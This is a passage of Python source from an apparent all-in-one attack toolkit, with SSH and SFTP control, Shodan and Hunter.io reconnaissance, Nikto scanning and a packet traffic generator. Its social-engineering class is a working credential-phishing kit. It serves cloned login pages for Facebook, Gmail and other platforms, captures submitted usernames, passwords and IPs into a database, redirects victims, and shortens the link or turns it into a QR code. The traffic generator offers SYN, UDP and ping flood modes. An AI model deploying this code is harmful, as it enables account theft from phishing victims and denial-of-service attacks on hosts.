        """Execute command on remote server"""
        if conn_id not in self.connections:
            return {'success': False, 'error': 'Not connected'}
        
        try:
            start_time = time.time()
            client = self.connections[conn_id]
            
            stdin, stdout, stderr = client.exec_command(command, timeout=30)
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            exit_code = stdout.channel.recv_exit_status()
            
            execution_time = time.time() - start_time
            full_output = output + ('\n' + error if error else '')
            
            # Save to database
            cmd_id = str(uuid.uuid4())[:8]
            self.db.save_ssh_command(cmd_id, conn_id, command, full_output, exit_code, execution_time, exit_code == 0)
            
            return {
                'success': exit_code == 0,
                'output': full_output,
                'exit_code': exit_code,
                'execution_time': execution_time
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_sftp_client(self, conn_id: str) -> Optional[paramiko.SFTPClient]:
        """Get SFTP client"""
        if conn_id not in self.connections:
            return None
        
        if conn_id not in self.sftp_clients:
            try:
                self.sftp_clients[conn_id] = self.connections[conn_id].open_sftp()
            except Exception as e:
                logger.error(f"Failed to open SFTP: {e}")
                return None
        
        return self.sftp_clients[conn_id]
    
    def upload_file(self, conn_id: str, local_path: str, remote_path: str) -> Dict[str, Any]:
        """Upload file to remote server"""
        if conn_id not in self.connections:
            return {'success': False, 'error': 'Not connected'}
        
        if not os.path.exists(local_path):
            return {'success': False, 'error': f'Local file not found: {local_path}'}
        
        try:
            sftp = self.get_sftp_client(conn_id)
            if not sftp:
                return {'success': False, 'error': 'Failed to open SFTP session'}
            
            file_size = os.path.getsize(local_path)
            start_time = time.time()
            
            sftp.put(local_path, remote_path)
            
            execution_time = time.time() - start_time
            
            transfer_id = str(uuid.uuid4())[:8]
            self.db.save_ssh_transfer(
                transfer_id, conn_id, local_path, remote_path, 'upload',
                file_size, 'completed', datetime.datetime.now().isoformat(),
                datetime.datetime.now().isoformat()
            )
            
            return {
                'success': True,
                'message': f'Uploaded {file_size} bytes to {remote_path}',
                'size': file_size,
                'execution_time': execution_time
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def download_file(self, conn_id: str, remote_path: str, local_path: str) -> Dict[str, Any]:
        """Download file from remote server"""
        if conn_id not in self.connections:
            return {'success': False, 'error': 'Not connected'}
        
        try:
            sftp = self.get_sftp_client(conn_id)
            if not sftp:
                return {'success': False, 'error': 'Failed to open SFTP session'}
            
            file_size = sftp.stat(remote_path).st_size
            start_time = time.time()
            
            sftp.get(remote_path, local_path)
            
            execution_time = time.time() - start_time
            
            transfer_id = str(uuid.uuid4())[:8]
            self.db.save_ssh_transfer(
                transfer_id, conn_id, local_path, remote_path, 'download',
                file_size, 'completed', datetime.datetime.now().isoformat(),
                datetime.datetime.now().isoformat()
            )
            
            return {
                'success': True,
                'message': f'Downloaded {file_size} bytes from {remote_path} to {local_path}',
                'size': file_size,
                'execution_time': execution_time
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def list_files(self, conn_id: str, remote_path: str = ".") -> Dict[str, Any]:
        """List files on remote server"""
        if conn_id not in self.connections:
            return {'success': False, 'error': 'Not connected'}
        
        try:
            sftp = self.get_sftp_client(conn_id)
            if not sftp:
                return {'success': False, 'error': 'Failed to open SFTP session'}
            
            files = sftp.listdir_attr(remote_path)
            
            file_list = []
            for f in files:
                file_list.append({
                    'name': f.filename,
                    'size': f.st_size,
                    'permissions': oct(f.st_mode)[-3:],
                    'modified': datetime.datetime.fromtimestamp(f.st_mtime).isoformat() if f.st_mtime else None,
                    'is_dir': stat.S_ISDIR(f.st_mode)
                })
            
            return {
                'success': True,
                'files': file_list,
                'count': len(file_list)
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_status(self, conn_id: str = None) -> Dict[str, Any]:
        """Get SSH status"""
        if conn_id:
            return {
                'connected': conn_id in self.connections,
                'sftp_active': conn_id in self.sftp_clients
            }
        else:
            return {
                'active_connections': len(self.connections),
                'connections': list(self.connections.keys())
            }
    
    def get_connection_info(self, conn_id: str) -> Optional[Dict]:
        """Get connection info from database"""
        return self.db.get_ssh_connection(conn_id)
    
    def get_all_connections(self) -> List[Dict]:
        """Get all configured connections"""
        return self.db.get_all_ssh_connections()
    
    def disconnect_all(self):
        """Disconnect all connections"""
        for conn_id in list(self.connections.keys()):
            self.disconnect(conn_id)

# =====================
# SHODAN MANAGER
# =====================
class ShodanManager:
    """Shodan API integration"""
    
    def __init__(self, db: DatabaseManager, config: Dict = None):
        self.db = db
        self.config = config or {}
        self.api_key = self.config.get('shodan', {}).get('api_key', '')
        self.api = None
        self.available = SHODAN_AVAILABLE and self.api_key
        
        if self.available:
            try:
                self.api = shodan.Shodan(self.api_key)
                logger.info("Shodan API initialized")
            except Exception as e:
                logger.error(f"Failed to initialize Shodan: {e}")
                self.available = False
    
    def is_available(self) -> bool:
        """Check if Shodan is available"""
        return self.available
    
    def search_ip(self, ip: str) -> Dict[str, Any]:
        """Search for IP information"""
        if not self.available:
            return {'success': False, 'error': 'Shodan not configured'}
        
        try:
            result = self.api.host(ip)
            
            # Extract data
            ports = result.get('ports', [])
            hostnames = result.get('hostnames', [])
            country = result.get('country_name', 'Unknown')
            city = result.get('city', 'Unknown')
            org = result.get('org', 'Unknown')
            os_info = result.get('os', 'Unknown')
            vulnerabilities = list(result.get('vulns', {}).keys())
            
            # Log to database
            self.db.log_shodan_result(ip, ports, hostnames, country, city, org, os_info, vulnerabilities, result)
            
            return {
                'success': True,
                'ip': ip,
                'ports': ports,
                'hostnames': hostnames,
                'country': country,
                'city': city,
                'org': org,
                'os': os_info,
                'vulnerabilities': vulnerabilities,
                'data': result.get('data', [])[:5]
            }
            
        except shodan.APIError as e:
            return {'success': False, 'error': f'Shodan API error: {e}'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def search(self, query: str, max_results: int = 100) -> Dict[str, Any]:
        """Search Shodan"""
        if not self.available:
            return {'success': False, 'error': 'Shodan not configured'}
        
        try:
            results = []
            for result in self.api.search(query, limit=max_results):
                results.append(result)
            
            return {
                'success': True,
                'query': query,
                'total': len(results),
                'results': results[:10]
            }
            
        except shodan.APIError as e:
            return {'success': False, 'error': f'Shodan API error: {e}'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def count(self, query: str) -> Dict[str, Any]:
        """Count Shodan results"""
        if not self.available:
            return {'success': False, 'error': 'Shodan not configured'}
        
        try:
            result = self.api.count(query)
            return {
                'success': True,
                'query': query,
                'total': result.get('total', 0)
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_stats(self) -> Dict[str, Any]:
        """Get Shodan usage statistics"""
        if not self.available:
            return {'available': False, 'error': 'Shodan not configured'}
        
        try:
            info = self.api.info()
            return {
                'available': True,
                'scan_credits': info.get('scan_credits', 0),
                'query_credits': info.get('query_credits', 0),
                'monitored_ips': info.get('monitored_ips', 0)
            }
        except Exception as e:
            return {'available': True, 'error': str(e)}

# =====================
# HUNTER.IO MANAGER
# =====================
class HunterManager:
    """Hunter.io API integration"""
    
    def __init__(self, db: DatabaseManager, config: Dict = None):
        self.db = db
        self.config = config or {}
        self.api_key = self.config.get('hunter', {}).get('api_key', '')
        self.api = None
        self.available = HUNTER_AVAILABLE and self.api_key
        
        if self.available:
            try:
                self.api = pyhunter.PyHunter(self.api_key)
                logger.info("Hunter.io API initialized")
            except Exception as e:
                logger.error(f"Failed to initialize Hunter.io: {e}")
                self.available = False
    
    def is_available(self) -> bool:
        """Check if Hunter.io is available"""
        return self.available
    
    def domain_search(self, domain: str, limit: int = 100) -> Dict[str, Any]:
        """Search for emails in domain"""
        if not self.available:
            return {'success': False, 'error': 'Hunter.io not configured'}
        
        try:
            result = self.api.domain_search(domain=domain, limit=limit)
            
            emails = result.get('emails', [])
            total = result.get('total', 0)
            pattern = result.get('pattern', '')
            organization = result.get('organization', '')
            
            # Log to database
            self.db.log_hunter_result(domain, emails, total, pattern, organization, result)
            
            return {
                'success': True,
                'domain': domain,
                'emails': emails,
                'total': total,
                'pattern': pattern,
                'organization': organization
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def email_verifier(self, email: str) -> Dict[str, Any]:
        """Verify email address"""
        if not self.available:
            return {'success': False, 'error': 'Hunter.io not configured'}
        
        try:
            result = self.api.email_verifier(email)
            return {
                'success': True,
                'email': email,
                'status': result.get('status', 'unknown'),
                'result': result
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def email_finder(self, domain: str, first_name: str, last_name: str) -> Dict[str, Any]:
        """Find email for specific person"""
        if not self.available:
            return {'success': False, 'error': 'Hunter.io not configured'}
        
        try:
            result = self.api.email_finder(domain=domain, first_name=first_name, last_name=last_name)
            return {
                'success': True,
                'domain': domain,
                'first_name': first_name,
                'last_name': last_name,
                'email': result.get('email', ''),
                'confidence': result.get('confidence', 0),
                'pattern': result.get('pattern', '')
            }
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def get_stats(self) -> Dict[str, Any]:
        """Get Hunter.io usage statistics"""
        if not self.available:
            return {'available': False, 'error': 'Hunter.io not configured'}
        
        try:
            info = self.get_account_info()
            return {
                'available': True,
                'requests_left': info.get('requests_left', 0),
                'plan': info.get('plan_name', 'Unknown'),
                'reset_date': info.get('reset_date', '')
            }
        except Exception as e:
            return {'available': True, 'error': str(e)}
    
    def get_account_info(self) -> Dict[str, Any]:
        """Get account information"""
        if not self.available:
            return {}
        
        try:
            return self.api.account_information()
        except Exception as e:
            return {'error': str(e)}

# =====================
# NIKTO SCANNER
# =====================
class NiktoScanner:
    """Nikto web vulnerability scanner"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.nikto_available = self._check_nikto()
    
    def _check_nikto(self) -> bool:
        """Check if Nikto is available"""
        return shutil.which('nikto') is not None
    
    def is_available(self) -> bool:
        """Check if Nikto is available"""
        return self.nikto_available
    
    def scan(self, target: str, options: Dict = None) -> Dict[str, Any]:
        """Run Nikto scan"""
        if not self.nikto_available:
            return {'success': False, 'error': 'Nikto not installed'}
        
        options = options or {}
        start_time = time.time()
        
        try:
            timestamp = int(time.time())
            output_file = os.path.join(NIKTO_RESULTS_DIR, f"nikto_{target.replace('/', '_')}_{timestamp}.json")
            
            cmd = ['nikto', '-host', target, '-Format', 'json', '-o', output_file]
            
            if options.get('ssl'):
                cmd.append('-ssl')
            if options.get('port'):
                cmd.extend(['-port', str(options['port'])])
            if options.get('tuning'):
                cmd.extend(['-Tuning', options['tuning']])
            if options.get('timeout'):
                cmd.extend(['-timeout', str(options['timeout'])])
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=options.get('timeout', 600),
                encoding='utf-8',
                errors='ignore'
            )
            
            scan_time = time.time() - start_time
            
            # Parse vulnerabilities
            vulnerabilities = []
            if os.path.exists(output_file):
                try:
                    with open(output_file, 'r') as f:
                        data = json.load(f)
                        if 'vulnerabilities' in data:
                            vulnerabilities = data['vulnerabilities']
                        elif isinstance(data, list):
                            vulnerabilities = data
                except:
                    pass
            
            # Parse text output for vulnerabilities
            if not vulnerabilities and result.stdout:
                lines = result.stdout.split('\n')
                for line in lines:
                    if any(x in line for x in ['+ ', '- ', 'OSVDB', 'CVE']):
                        vulnerabilities.append({
                            'description': line.strip(),
                            'severity': self._determine_severity(line)
                        })
            
            # Log to database
            self.db.log_nikto_scan(target, vulnerabilities, scan_time, output_file, result.returncode == 0)
            
            return {
                'success': result.returncode == 0,
                'target': target,
                'vulnerabilities': vulnerabilities,
                'count': len(vulnerabilities),
                'scan_time': scan_time,
                'output_file': output_file
            }
            
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timed out'}
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _determine_severity(self, line: str) -> str:
        """Determine severity from Nikto output"""
        line_lower = line.lower()
        if any(word in line_lower for word in ['critical', 'severe', 'remote root']):
            return 'critical'
        elif any(word in line_lower for word in ['high', 'vulnerable', 'exploit']):
            return 'high'
        elif any(word in line_lower for word in ['medium', 'warning', 'exposed']):
            return 'medium'
        else:
            return 'low'

# =====================
# TRAFFIC GENERATOR
# =====================
class TrafficGenerator:
    """Network traffic generator"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.scapy_available = SCAPY_AVAILABLE
        self.active_generators = {}
        self.stop_events = {}
    
    def get_available_types(self) -> List[str]:
        """Get available traffic types"""
        types = ['icmp', 'tcp_syn', 'tcp_ack', 'udp', 'http_get', 'http_post', 'dns']
        
        if self.scapy_available:
            types.extend(['ping_flood', 'syn_flood', 'udp_flood', 'mixed', 'random'])
        
        return types
    
    def generate(self, traffic_type: str, target_ip: str, duration: int,
                port: int = None, packet_rate: int = 100) -> Dict[str, Any]:
        """Generate traffic"""
        generator_id = f"{target_ip}_{traffic_type}_{int(time.time())}"
        
        try:
            # Validate inputs
            if traffic_type not in self.get_available_types():
                return {'success': False, 'error': f'Invalid traffic type: {traffic_type}'}
            
            ipaddress.ip_address(target_ip)
            
            # Set default port
            if port is None:
                if traffic_type in ['http_get', 'http_post']:
                    port = 80
                elif traffic_type == 'dns':
                    port = 53
                else:
                    port = 0
            
            # Create generator
            generator = {
                'id': generator_id,
                'type': traffic_type,
                'target_ip': target_ip,
                'target_port': port,
                'duration': duration,
                'packet_rate': packet_rate,
                'start_time': datetime.datetime.now().isoformat(),
                'status': 'running',
                'packets_sent': 0,
                'bytes_sent': 0
            }
            
            stop_event = threading.Event()
            self.stop_events[generator_id] = stop_event
            
            # Start thread
            thread = threading.Thread(
                target=self._run_generator,
                args=(generator_id, generator, stop_event)
            )
            thread.daemon = True
            thread.start()
            
            self.active_generators[generator_id] = generator
            
            # Log traffic start
            self.db.log_traffic(
                traffic_type, target_ip, port, duration, 0, 0,
                'running', 'system', None
            )
            
            return {
                'success': True,
                'generator_id': generator_id,
                'message': f'Traffic generation started: {traffic_type} to {target_ip} for {duration}s'
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _run_generator(self, generator_id: str, generator: Dict, stop_event: threading.Event):
        """Run traffic generator in thread"""
        start_time = time.time()
        end_time = start_time + generator['duration']
        packet_interval = 1.0 / max(1, generator['packet_rate'])
        
        while time.time() < end_time and not stop_event.is_set():
            try:
                packet_size = self._send_packet(
                    generator['type'],
                    generator['target_ip'],
                    generator['target_port']
                )
                
                if packet_size > 0:
                    generator['packets_sent'] += 1
                    generator['bytes_sent'] += packet_size
                
                time.sleep(packet_interval)
                
            except Exception as e:
                logger.error(f"Traffic generation error: {e}")
                time.sleep(0.1)
        
        generator['status'] = 'completed' if not stop_event.is_set() else 'stopped'
        
        # Log completion
        self.db.log_traffic(
            generator['type'], generator['target_ip'], generator['target_port'],
            generator['duration'], generator['packets_sent'], generator['bytes_sent'],
            generator['status'], 'system', None
        )
        
        # Cleanup
        if generator_id in self.active_generators:
            del self.active_generators[generator_id]
        if generator_id in self.stop_events:
            del self.stop_events[generator_id]
    
    def _send_packet(self, traffic_type: str, target_ip: str, port: int) -> int:
        """Send a single packet"""
        if traffic_type == 'icmp':
            return self._send_icmp(target_ip)
        elif traffic_type == 'tcp_syn':
            return self._send_tcp_syn(target_ip, port)
        elif traffic_type == 'udp':
            return self._send_udp(target_ip, port)
        elif traffic_type == 'http_get':
            return self._send_http_get(target_ip, port)
        elif traffic_type == 'http_post':
            return self._send_http_post(target_ip, port)
        elif traffic_type == 'dns':
            return self._send_dns(target_ip, port)
        else:
            return self._send_default(target_ip, port)
    
    def _send_icmp(self, target_ip: str) -> int:
        """Send ICMP echo request"""
        try:
            if self.scapy_available:
                from scapy.all import IP, ICMP, send
                packet = IP(dst=target_ip)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            else:
                import platform
                count = 1
                if platform.system().lower() == 'windows':
                    cmd = ['ping', '-n', str(count), target_ip]
                else:
                    cmd = ['ping', '-c', str(count), target_ip]
                
                subprocess.run(cmd, capture_output=True, timeout=5)
                return 64
        except:
            return 0
    
    def _send_tcp_syn(self, target_ip: str, port: int) -> int:
        """Send TCP SYN packet"""
        try:
            if self.scapy_available:
                from scapy.all import IP, TCP, send
                packet = IP(dst=target_ip)/TCP(dport=port, flags='S')
                send(packet, verbose=False)
                return len(packet)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect_ex((target_ip, port))
                sock.close()
                return 60
        except:
            return 0
    
    def _send_udp(self, target_ip: str, port: int) -> int:
        """Send UDP packet"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b'LordSpyk3 Test Packet'
            sock.sendto(data, (target_ip, port))
            sock.close()
            return len(data) + 8
        except:
            return 0
    
    def _send_http_get(self, target_ip: str, port: int) -> int:
        """Send HTTP GET request"""
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            conn.request('GET', '/', headers={'User-Agent': 'LordSpyk3'})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _send_http_post(self, target_ip: str, port: int) -> int:
        """Send HTTP POST request"""
        try:
            conn = http.client.HTTPConnection(target_ip, port, timeout=2)
            data = 'test=value'
            headers = {
                'User-Agent': 'LordSpyk3',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': str(len(data))
            }
            conn.request('POST', '/', body=data, headers=headers)
            response = conn.getresponse()
            response_data = response.read()
            conn.close()
            return len(data) + len(response_data) + 200
        except:
            return 0
    
    def _send_dns(self, target_ip: str, port: int) -> int:
        """Send DNS query"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Simple DNS query for google.com
            transaction_id = random.randint(0, 65535).to_bytes(2, 'big')
            flags = b'\x01\x00'
            questions = b'\x00\x01'
            query = b'\x06google\x03com\x00'
            qtype = b'\x00\x01'
            qclass = b'\x00\x01'
            
            dns_query = transaction_id + flags + questions + questions + b'\x00\x00\x00\x00' + query + qtype + qclass
            sock.sendto(dns_query, (target_ip, port))
            sock.close()
            return len(dns_query) + 8
        except:
            return 0
    
    def _send_default(self, target_ip: str, port: int) -> int:
        """Send default packet"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect_ex((target_ip, port))
            sock.close()
            return 60
        except:
            return 0
    
    def stop(self, generator_id: str = None) -> bool:
        """Stop traffic generation"""
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        """Get active generators"""
        return list(self.active_generators.values())
    
    def get_types_help(self) -> str:
        """Get help for traffic types"""
        return """Available Traffic Types:
  icmp      - ICMP echo requests (ping)
  tcp_syn   - TCP SYN packets
  udp       - UDP packets
  http_get  - HTTP GET requests
  http_post - HTTP POST requests
  dns       - DNS queries
  ping_flood - ICMP flood (requires scapy)
  syn_flood  - SYN flood (requires scapy)
  udp_flood  - UDP flood (requires scapy)
  mixed      - Mixed traffic types
  random     - Random traffic patterns

Usage: generate_traffic <type> <ip> <duration> [port] [rate]
Example: generate_traffic icmp 8.8.8.8 10
Example: generate_traffic http_get 192.168.1.1 30 80 100"""

# =====================
# SOCIAL ENGINEERING TOOLS
# =====================
class SocialEngineeringTools:
    """Social engineering and phishing tools"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.phishing_server = None
        self.active_links = {}
    
    def generate_phishing_link(self, platform: str, custom_url: str = None,
                              custom_template: str = None) -> Dict[str, Any]:
        """Generate phishing link"""
        try:
            link_id = str(uuid.uuid4())[:8]
            
            # Get template
            if custom_template:
                html_content = custom_template
            else:
                templates = self.db.get_phishing_templates(platform)
                if templates:
                    html_content = templates[0].get('html_content', '')
                else:
                    html_content = self._get_default_template(platform)
            
            phishing_url = f"http://localhost:8080/{link_id}"
            
            # Save to database
            self.db.save_phishing_link(
                link_id, platform, custom_url or f"https://www.{platform}.com",
                phishing_url, platform, datetime.datetime.now().isoformat()
            )
            
            self.active_links[link_id] = {
                'platform': platform,
                'html': html_content,
                'created': datetime.datetime.now()
            }
            
            return {
                'success': True,
                'link_id': link_id,
                'platform': platform,
                'phishing_url': phishing_url
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    def _get_default_template(self, platform: str) -> str:
        """Get default template for platform"""
        if platform == 'facebook':
            return self.db._get_facebook_template()
        elif platform == 'instagram':
            return self.db._get_instagram_template()
        elif platform == 'twitter':
            return self.db._get_twitter_template()
        elif platform == 'gmail':
            return self.db._get_gmail_template()
        elif platform == 'linkedin':
            return self.db._get_linkedin_template()
        else:
            return self._get_custom_template()
    
    def _get_custom_template(self) -> str:
        """Get custom template"""
        return """<!DOCTYPE html>
<html>
<head>
    <title>Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            max-width: 400px;
            width: 100%;
            padding: 20px;
        }
        .login-box {
            background: white;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            padding: 40px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #2a5298;
            font-size: 28px;
            margin: 0;
        }
        .form-group {
            margin-bottom: 20px;
        }
        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            box-sizing: border-box;
        }
        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        .warning {
            margin-top: 20px;
            padding: 10px;
            background-color: #fff3cd;
            border: 1px solid #ffeeba;
            border-radius: 5px;
            color: #856404;
            text-align: center;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="logo"><h1>Login</h1></div>
            <form method="POST" action="/capture">
                <div class="form-group">
                    <input type="text" name="username" placeholder="Username or Email" required>
                </div>
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                <button type="submit">Sign In</button>
            </form>
            <div class="warning">
                ⚠️ This is a security test page. Do not enter real credentials.
            </div>
        </div>
    </div>
</body>
</html>"""
    
    def start_phishing_server(self, link_id: str, port: int = 8080) -> bool:
        """Start phishing server"""
        if link_id not in self.active_links:
            return False
        
        # Create simple HTTP server
        class PhishingHandler(BaseHTTPRequestHandler):
            def do_GET(self):
                if self.path == '/':
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html')
                    self.end_headers()
                    self.wfile.write(server.html_content.encode('utf-8'))
                    
                    # Update click count
                    if server.db and server.link_id:
                        server.db.update_phishing_link_clicks(server.link_id)
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def do_POST(self):
                if self.path == '/capture':
                    content_length = int(self.headers.get('Content-Length', 0))
                    post_data = self.rfile.read(content_length).decode('utf-8')
                    form_data = urllib.parse.parse_qs(post_data)
                    
                    username = form_data.get('username', form_data.get('email', ['']))[0]
                    password = form_data.get('password', [''])[0]
                    client_ip = self.client_address[0]
                    user_agent = self.headers.get('User-Agent', 'Unknown')
                    
                    if server.db and server.link_id:
                        server.db.save_captured_credential(
                            server.link_id, username, password, client_ip, user_agent, ''
                        )
                    
                    self.send_response(302)
                    self.send_header('Location', 'https://www.google.com')
                    self.end_headers()
        
        # Set up server
        handler = PhishingHandler
        server = socketserver.TCPServer(('0.0.0.0', port), handler)
        handler.server_instance = self
        
        # Store server reference
        self.phishing_server = {
            'server': server,
            'thread': threading.Thread(target=server.serve_forever, daemon=True),
            'link_id': link_id,
            'port': port,
            'html_content': self.active_links[link_id]['html']
        }
        
        # Start server
        self.phishing_server['thread'].start()
        
        return True
    
    def stop_phishing_server(self):
        """Stop phishing server"""
        if self.phishing_server:
            self.phishing_server['server'].shutdown()
            self.phishing_server['server'].server_close()
            self.phishing_server = None
    
    def get_server_url(self) -> str:
        """Get phishing server URL"""
        if not self.phishing_server:
            return None
        
        local_ip = self._get_local_ip()
        return f"http://{local_ip}:{self.phishing_server['port']}"
    
    def get_active_links(self) -> List[Dict]:
        """Get active phishing links"""
        return [{'link_id': k, 'platform': v['platform'], 'created': v['created'].isoformat()}
                for k, v in self.active_links.items()]
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        """Get captured credentials"""
        return self.db.get_captured_credentials(link_id)
    
    def generate_qr_code(self, link_id: str) -> Optional[str]:
        """Generate QR code for link"""
        if not QRCODE_AVAILABLE:
            return None
        
        link = self.db.get_phishing_link(link_id)
        if not link:
            return None
        
        url = link.get('phishing_url', '')
        if self.phishing_server and self.phishing_server.get('link_id') == link_id:
            url = self.get_server_url()
        
        qr_filename = os.path.join(PHISHING_DIR, f"qr_{link_id}.png")
        
        try:
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(url)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            img.save(qr_filename)
            return qr_filename
        except Exception as e:
            logger.error(f"QR generation error: {e}")
            return None
    
    def shorten_url(self, link_id: str) -> Optional[str]:
        """Shorten URL"""
        if not SHORTENER_AVAILABLE:
            return None
        
        link = self.db.get_phishing_link(link_id)
        if not link:
            return None
        
        url = link.get('phishing_url', '')
        if self.phishing_server and self.phishing_server.get('link_id') == link_id:
            url = self.get_server_url()
        
        try:
            s = pyshorteners.Shortener()
            return s.tinyurl.short(url)
        except Exception as e:
            logger.error(f"URL shortening error: {e}")
            return None
    
    def _get_local_ip(self) -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(('8.8.8.8', 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return '127.0.0.1'

# =====================
# TIME MANAGER
# =====================
class TimeManager:
    """Time and date management"""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def get_current_time(self, full: bool = False) -> str:
        """Get current time"""
        now = datetime.datetime.now()
        tz = now.astimezone().tzinfo
        
        if full:
            return (f"🕐 Current Time: {now.strftime('%H:%M:%S')} {tz}\n"
                   f"   Unix Timestamp: {int(time.time())}\n"
                   f"   ISO Format: {now.isoformat()}")
        else:
            return f"🕐 Current Time: {now.strftime('%H:%M:%S')} {tz}"
    
    def get_current_date(self, full: bool = False) -> str:
        """Get current date"""
        now = datetime.datetime.now()
        
        if full:
            return (f"📅 Current Date: {now.strftime('%A, %B %d, %Y')}\n"
                   f"   Day of Year: {now.timetuple().tm_yday}\n"
                   f"   Week Number: {now.isocalendar()[1]}")
        else:
            return f"📅 Current Date: {now.strftime('%A, %B %d, %Y')}"
    
    def get_datetime(self, full: bool = False) -> str:
        """Get current date and time"""
        now = datetime.datetime.now()
        
        if full:
            return (f"📅 Date: {now.strftime('%A, %B %d, %Y')}\n"
                   f"🕐 Time: {now.strftime('%H:%M:%S')} {now.astimezone().tzinfo}\n"
                   f"   Unix Timestamp: {int(time.time())}\n"
                   f"   UTC: {now.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}")
        else:
            return (f"📅 Date: {now.strftime('%A, %B %d, %Y')}\n"
                   f"🕐 Time: {now.strftime('%H:%M:%S')} {now.astimezone().tzinfo}")
    
    def get_timezone_info(self) -> str:
        """Get timezone information"""
        now = datetime.datetime.now()
        return (f"🌍 Timezone Information:\n"
               f"   Current Timezone: {now.astimezone().tzinfo}\n"
               f"   UTC Offset: {now.strftime('%z')}\n"
               f"   DST Active: {bool(now.dst())}\n"
               f"   UTC Time: {now.utcnow().strftime('%H:%M:%S')}")
    
    def get_time_difference(self, time1: str, time2: str) -> str:
        """Calculate time difference"""
        try:
            t1 = datetime.datetime.strptime(time1, "%H:%M:%S")
            t2 = datetime.datetime.strptime(time2, "%H:%M:%S")
            diff = abs((t2 - t1).total_seconds())
            hours = int(diff // 3600)
            minutes = int((diff % 3600) // 60)
            seconds = int(diff % 60)
            return f"⏱️ Time Difference: {hours}h {minutes}m {seconds}s"
        except:
            return "❌ Invalid time format. Use HH:MM:SS"
    
    def get_date_difference(self, date1: str, date2: str) -> str:
        """Calculate date difference"""
        try:
            d1 = datetime.datetime.strptime(date1, "%Y-%m-%d")
            d2 = datetime.datetime.strptime(date2, "%Y-%m-%d")
            diff = abs((d2 - d1).days)
            return (f"📅 Date Difference:\n"
                   f"   Days: {diff}\n"
                   f"   Weeks: {diff // 7}\n"
                   f"   Months: {diff // 30}\n"
                   f"   Years: {diff // 365}")
        except:
            return "❌ Invalid date format. Use YYYY-MM-DD"

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    """Network diagnostic tools"""
    
    @staticmethod
    def ping(target: str, count: int = 4) -> Dict[str, Any]:
        """Ping target"""
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), target]
            else:
                cmd = ['ping', '-c', str(count), target]
            
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            
            # Parse output
            output = result.stdout + result.stderr
            
            # Extract statistics
            packet_loss = 100
            avg_rtt = None
            
            if platform.system().lower() == 'windows':
                loss_match = re.search(r'Lost = (\d+)', output)
                if loss_match:
                    lost = int(loss_match.group(1))
                    packet_loss = (lost / count) * 100
                
                avg_match = re.search(r'Average = (\d+)ms', output)
                if avg_match:
                    avg_rtt = float(avg_match.group(1))
            else:
                loss_match = re.search(r'(\d+)% packet loss', output)
                if loss_match:
                    packet_loss = int(loss_match.group(1))
                
                avg_match = re.search(r'rtt min/avg/max/mdev = [\d.]+/([\d.]+)/', output)
                if avg_match:
                    avg_rtt = float(avg_match.group(1))
            
            return {
                'success': result.returncode == 0,
                'output': output,
